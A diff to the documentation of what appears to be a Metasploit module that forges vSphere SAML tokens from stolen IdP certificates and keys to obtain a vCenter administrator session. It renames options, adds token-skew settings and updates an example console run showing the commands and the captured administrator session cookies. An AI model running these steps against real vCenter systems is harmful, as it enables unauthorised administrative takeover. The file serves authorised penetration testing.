@@ -28,7 +28,7 @@ accordingly.
 2. Start msfconsole
 3. Do: `use auxiliary/admin/vmware/vcenter_forge_saml_token.rb`
 4. Do: `set rhosts <vCenter appliance IPv4 or FQDN>`
-5. Do: `set vc_fqdn <vCenter appliance FQDN>`
+5. Do: `set vhost <vCenter appliance FQDN>`
 6. Do: `set vc_idp_cert <path to IdP cert>`
 7. Do: `set vc_idp_key <path to IdP key>`
 8. Do: `set vc_vmca_cert <path to VMCA cert>`
@@ -40,7 +40,8 @@ accordingly.
 ## Options
 **DOMAIN**
 
-The vSphere SSO domain. By default this is `vsphere.local`.
+The vSphere SSO domain; by default this is `vsphere.local`. If this does not match the vSphere SSO
+domain, the module will return `HTTP 400: Issuer not trusted` on execution.
 
 **USERNAME**
 
@@ -53,22 +54,35 @@ should be no reason to modify the target user from the default `administrator` i
 The vCenter appliance IPv4 address or DNS FQDN. This must be reachable over HTTPS for the module
 to function.
 
-**VC_FQDN**
+**VHOST**
 
 The fully qualified DNS name of the vCenter appliance; this must be present in the Issuer element
-of the assertion for the module to function.
+of the assertion for the module to function. If this value does not match the vCenter appliance
+FQDN, the module will return `HTTP 400` during the initial `GET` request.
 
 **VC_IDP_CERT**
 
-The filesystem path to the PEM-formatted vCenter SSO IdP certificate.
+The filesystem path to the vCenter SSO IdP certificate in DER or PEM format.
 
 **VC_IDP_KEY**
 
-The filesystem path to the PEM-formatted vCenter SSO IdP private key.
+The filesystem path to the vCenter SSO IdP private key in DER or PEM format.
 
 **VC_VMCA_CERT**
 
-The filesystem path to the PEM-formatted vCenter VMCA certificate.
+The filesystem path to the vCenter VMCA certificate in DER or PEM format.
+
+## Advanced Options
+
+**VC_IDP_TOKEN_BEFORE_SKEW**
+
+Number of seconds to subtract when preparing the assertion validity start time. Valid values are between
+`300` (five minutes) and `2592000` (30 days); default is `2592000`.
+
+**VC_IDP_TOKEN_AFTER_SKEW**
+
+Number of seconds to add when preparing the assertion validity end time. Valid values are between
+`300` (five minutes) and `2592000` (30 days); default is `2592000`.
 
 ## Scenarios
 ### Extracting the vSphere SSO certificates
@@ -176,8 +190,8 @@ Example run against vCenter appliance version 7.0 Update 3d:
 msf6 > use auxiliary/admin/vmware/vcenter_forge_saml_token.rb
 msf6 auxiliary(admin/vmware/vcenter_forge_saml_token) > set RHOSTS 192.168.100.110
 RHOSTS => 192.168.100.110
-msf6 auxiliary(admin/vmware/vcenter_forge_saml_token) > set VC_FQDN vcenter.cesium137.io
-VC_FQDN => vcenter.cesium137.io
+msf6 auxiliary(admin/vmware/vcenter_forge_saml_token) > set VHOST vcenter.cesium137.io
+VHOST => vcenter.cesium137.io
 msf6 auxiliary(admin/vmware/vcenter_forge_saml_token) > set VC_IDP_CERT ~/idp.pem
 VC_IDP_CERT => ~/idp.pem
 msf6 auxiliary(admin/vmware/vcenter_forge_saml_token) > set VC_IDP_KEY ~/idp.key
@@ -190,8 +204,11 @@ msf6 auxiliary(admin/vmware/vcenter_forge_saml_token) > run
 [+] Validated vCenter Single Sign-On IdP trusted certificate chain
 [*] HTTP GET => /ui/login ...
 [*] HTTP POST => /ui/saml/websso/sso ...
+[*] Got cookie: VSPHERE-CLIENT-SESSION-INDEX=_ad4a6b68b157bded0de5ec6ce2cab324
+[*] Got cookie: VSPHERE-UI-JSESSIONID=DA9ECA61A289E32D31D9926D0CD433C1
+[*] Got cookie: VSPHERE-USERNAME=administrator%40vsphere.local
 [+] Got valid administrator session token!
-[+]     JSESSIONID=61B850134A734E790AC3F2C644E2F7F0; Path=/ui
+[+]     JSESSIONID=DA9ECA61A289E32D31D9926D0CD433C1; Path=/ui
 [*] Auxiliary module execution completed
 msf6 auxiliary(admin/vmware/vcenter_forge_saml_token) >
 ```
